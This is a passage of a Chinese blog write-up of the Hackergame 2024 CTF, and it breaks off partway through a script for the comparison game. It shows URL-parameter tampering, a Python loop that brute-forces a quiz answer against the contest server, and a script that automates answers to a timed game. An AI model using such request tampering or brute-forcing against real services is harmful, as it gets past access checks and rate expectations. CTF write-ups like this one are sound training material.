@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html lang="zh-CN" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="看看你的 flag！">
+<title>Hackergame 2024</title>
+
+<link rel='canonical' href='https://blog.tinyume.com/2024/hackergame-2024/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Hackergame 2024">
+<meta property='og:description' content="看看你的 flag！">
+<meta property='og:url' content='https://blog.tinyume.com/2024/hackergame-2024/'>
+<meta property='og:site_name' content='黯梦萦辰'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-11-12T21:03:14&#43;08:00'/><meta property='article:modified_time' content='2024-11-12T21:03:14&#43;08:00'/>
+<meta name="twitter:title" content="Hackergame 2024">
+<meta name="twitter:description" content="看看你的 flag！">
+    <link rel="shortcut icon" href="https://s2.loli.net/2025/01/11/oE6LCK18VcgRutx.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "auto");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    <img src="https://weavatar.com/avatar/1f332bb36f390f81d4d3287440e56842?size=256" width="300" height="300" class="site-logo" loading="lazy" alt="Avatar">
+                
+                </a>
+                
+                    <span class="emoji">💤</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">黯梦萦辰</a></h1>
+            <h2 class="site-description">Stay cool. Stay pythonic.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/iyume'
+                        target="_blank"
+                        title="Github"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#签到">签到</a></li>
+    <li><a href="#喜欢做签到的-ctfer-你们好呀">喜欢做签到的 CTFer 你们好呀</a></li>
+    <li><a href="#猫咪问答hackergame-十周年纪念版">猫咪问答（Hackergame 十周年纪念版）</a></li>
+    <li><a href="#比大小王">比大小王</a></li>
+    <li><a href="#旅行照片-40">旅行照片 4.0</a></li>
+    <li><a href="#nodejs-is-web-scale">Node.js is Web Scale</a></li>
+    <li><a href="#paolugpt">PaoluGPT</a></li>
+    <li><a href="#惜字如金-30">惜字如金 3.0</a></li>
+    <li><a href="#less-文件查看器在线版">LESS 文件查看器在线版</a></li>
+    <li><a href="#禁止内卷">禁止内卷</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/live/" style="background-color: #2a9d8f; color: #fff;">
+                日常
+            </a>
+        
+            <a href="/categories/code/" style="background-color: #df7988; color: #fff;">
+                代码
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/2024/hackergame-2024/">Hackergame 2024</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            看看你的 flag！
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2024-11-12 21:03</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前言">前言
+</h2><p>比赛时间：北京时间 2024 年 11 月 02 日 中午 12:00 ～ 11 月 09 日 中午 12:00（共七天）</p>
+<p>当前分数：1750， 总排名：340 / 2460</p>
+<p>AI：0 ， binary：0 ， general：500 ， math：150 ， web：1100</p>
+<p>今年毕业工作了，虽然公司也没什么忙的（甚至上班摸鱼玩了会），但下班过后再打开电脑确实会感觉时间很少。
+不过也算是尽力完成了这次比赛，虽然 misc 的几道简单题没做出来很遗憾，但是 hackergame 依然是很有趣的比赛。</p>
+<p>往年比赛 Writeup 2020、2021、2023 可以翻以前的博文（我才发现 hugo 没有 relative markdown 解析，唉果然还是想自己写一个）</p>
+<h2 id="签到">签到
+</h2><p>直接点击启动观察到 url <code>http://202.38.93.141:12024/?pass=false</code>。</p>
+<p>改为 <code>http://202.38.93.141:12024/?pass=true</code> 即可拿到 flag。</p>
+<h2 id="喜欢做签到的-ctfer-你们好呀">喜欢做签到的 CTFer 你们好呀
+</h2><p>通过检索得到 USTC NEBULA 战队，在继续检索相关信息可以得到 <a class="link" href="https://www.nebuu.la/"  target="_blank" rel="noopener"
+    >https://www.nebuu.la/</a> 这个网站。</p>
+<p>直观看上去就是一个 shell 嘛，先 <code>help</code> 看一下，然后看到有个 <code>env</code> 命令，直接查看就可以收获第一个 flag。</p>
+<p>第二个 flag 也很简单，<code>ls -al</code> 或者 <code>ls and-We-are-Waiting-for-U</code> 都能看到 <code>.flag</code> 文件（后者不知道是不是 bug）。</p>
+<h2 id="猫咪问答hackergame-十周年纪念版">猫咪问答（Hackergame 十周年纪念版）
+</h2><ol>
+<li>
+<p>在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？（30 分）</p>
+<p>2015 年就是第二届，而现有的资料都是从 2018 年才有的，搜索引擎对 hackergame 2015 根本没有搜录。</p>
+<p>那么首先去 <a class="link" href="https://lug.ustc.edu.cn"  target="_blank" rel="noopener"
+    >https://lug.ustc.edu.cn</a> 翻翻可以直接在导航栏看到 <a class="link" href="https://lug.ustc.edu.cn/wiki/lug/events/hackergame/"  target="_blank" rel="noopener"
+    >信息安全大赛</a>，点开 <a class="link" href="https://lug.ustc.edu.cn/wiki/sec/contest.html"  target="_blank" rel="noopener"
+    >第二届安全竞赛（存档）</a> 就可以看到答案了。</p>
+</li>
+<li>
+<p>众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？（30 分）</p>
+<p>比赛首页 <a class="link" href="https://hack.lug.ustc.edu.cn/"  target="_blank" rel="noopener"
+    >https://hack.lug.ustc.edu.cn/</a> 就有第六届-第十届的所有新闻稿，里面就写了参赛人数，每个对比一下，最高人数就是 2019 年第六届的 2682 人。</p>
+</li>
+<li>
+<p>Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？（20 分）</p>
+<p>既然是热搜，那首先去 google search trending 看看关联搜索词呗，没有结果，那就只能去看看 <a class="link" href="https://github.com/ustclug/hackergame2018-writeups"  target="_blank" rel="noopener"
+    >2018 年</a> 有什么题目了 ，翻到 <a class="link" href="https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md"  target="_blank" rel="noopener"
+    >猫咪问答</a> 就可以看到答案了。</p>
+</li>
+<li>
+<p>在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？（10 分）</p>
+<p>这题是花了时间最长的。</p>
+<p>首先搜索 usenix 可以得到 <a class="link" href="https://www.usenix.org/conference/usenixsecurity24"  target="_blank" rel="noopener"
+    >USENIX 2024</a> 这个网站，但是这个页面数据有点多，不知道从何下手，于是谷歌站点检索 <code>USENIX Security Email Forgery Attacks site:https://www.usenix.org/conference/usenixsecurity24</code> 可以得到 <a class="link" href="https://www.usenix.org/conference/usenixsecurity24/technical-sessions"  target="_blank" rel="noopener"
+    >论文列表</a>，其中和 email 关键词相关的论文就只有 <a class="link" href="https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui"  target="_blank" rel="noopener"
+    >这一篇</a>。</p>
+<p>拿到论文后就直接跳到 experiment results 那边，可以看到 16 个电子邮件提供商和 20 个客户端，于是就分别尝试了 16 / 20 / 320 作为答案但是都不行，但是也懒得阅读论文，于是只能在其他题目都做完后进行爆破。</p>
+<p>源码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://202.38.93.141:13030&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">TOKEN</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">TOKEN</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;testing&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;q1=3A204&amp;q2=2682&amp;q3=%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB&amp;q4=</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&amp;q5=6e90b6&amp;q6=1833&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">content</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;flag{&#34;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;found flag&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终结果是 336，而在论文里也确实能看到 <code>336 combinations</code>，这题感觉出的有点差。</p>
+</li>
+<li>
+<p>10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？（5 分）</p>
+<p>去 linux kernel 源码找到当天的提交记录就行。</p>
+</li>
+<li>
+<p>大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？（5 分）</p>
+<p>搜索 llama 3 70b 就是 <a class="link" href="https://huggingface.co/meta-llama/Meta-Llama-3-70B"  target="_blank" rel="noopener"
+    >这个模型</a> 了，因为我比较熟悉 AI 模型嘛，所以知道 AutoTokenizer 可以直接加载。</p>
+<p>源码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">transformers</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">torch</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tokenizers</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">html</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./test4.html&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># model_id = &#34;meta-llama/Meta-Llama-3-70B&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">model_id</span> <span class="o">=</span> <span class="s2">&#34;NousResearch/Meta-Llama-3-70B&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># pipeline = transformers.pipeline(</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     &#34;text-generation&#34;,</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     model=model_id,</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     model_kwargs={&#34;torch_dtype&#34;: torch.bfloat16},</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     device_map=&#34;auto&#34;,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># )</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># print(pipeline.tokenizer)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">tokenizer</span> <span class="o">=</span> <span class="n">transformers</span><span class="o">.</span><span class="n">AutoTokenizer</span><span class="o">.</span><span class="n">from_pretrained</span><span class="p">(</span><span class="n">model_id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tokens</span> <span class="o">=</span> <span class="n">tokenizer</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">tokens</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># tokenizer = tokenizers.Tokenizer.from_file(&#34;./tokenizer.json&#34;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># tokens = tokenizer.encode(html)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># print(len(tokens))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出是 1835，而官方 writeup 上似乎是 1834，再减去 BOS token，答案是 1833。
+但是可能是因为我的源码直接从 devtools 拷贝下来的，所以可能有点不对。</p>
+<p>这题出的也不怎样，第一点是这个模型下载在 huggingface 上根本申请不到，只能去官网，第二点是这个 html 源码还需要你去把每个答案重新删掉再进一遍，很麻烦。</p>
+</li>
+</ol>
+<h2 id="比大小王">比大小王
+</h2><p>devtools 看网络请求，可以一次性拿到所有题目，然后看 js submit 提交数据逻辑。</p>
+<p>脚本如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://202.38.93.141:12122&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">TOKEN</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="n">TOKEN</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">game_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/game&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">json</span><span class="o">=</span><span class="p">{},</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">game_response</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">game_response</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">data sample:
+</span></span></span><span class="line"><span class="cl"><span class="s2">{&#39;startTime&#39;: 1730558634.07, &#39;values&#39;: [[5, 2], [11, 12], [6, 15], [19, 4], [2, 10], [1, 10], [8, 10], [12, 10], [15, 8], [1, 8], [1, 13], [16, 11], [17, 18], [16, 19], [2, 9], [3, 6], [9, 1], [8, 12], [7, 19], [10, 7], [12, 6], [6, 18], [19, 7], [9, 6], [7, 4], [5, 17], [13, 14], [5, 9], [12, 10], [11, 14], [7, 17], [11, 12], [19, 8], [19, 2], [18, 1], [2, 16], [8, 5], [15, 13], [8, 7], [4, 8], [11, 0], [9, 4], [9, 2], [19, 17], [4, 19], [4, 12], [14, 15], [4, 10], [9, 11], [17, 5], [19, 2], [8, 16], [8, 3], [7, 11], [2, 13], [4, 13], [5, 10], [17, 5], [15, 16], [7, 17], [18, 9], [4, 17], [2, 5], [7, 10], [11, 4], [12, 8], [18, 9], [11, 8], [14, 1], [15, 3], [7, 15], [15, 16], [2, 15], [10, 3], [7, 15], [16, 2], [1, 6], [18, 12], [5, 4], [7, 16], [5, 13], [1, 18], [12, 3], [16, 18], [7, 3], [9, 8], [2, 15], [4, 8], [7, 16], [19, 0], [12, 9], [9, 12], [3, 9], [18, 19], [10, 15], [15, 2], [18, 17], [4, 10], [2, 4], [6, 15]]}
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">game_details</span> <span class="o">=</span> <span class="n">game_response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">game_details</span><span class="p">[</span><span class="s2">&#34;values&#34;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">value</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;&lt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># {&#39;message&#39;: &#39;检测到时空穿越，挑战失败！&#39;}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;waiting 8s&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
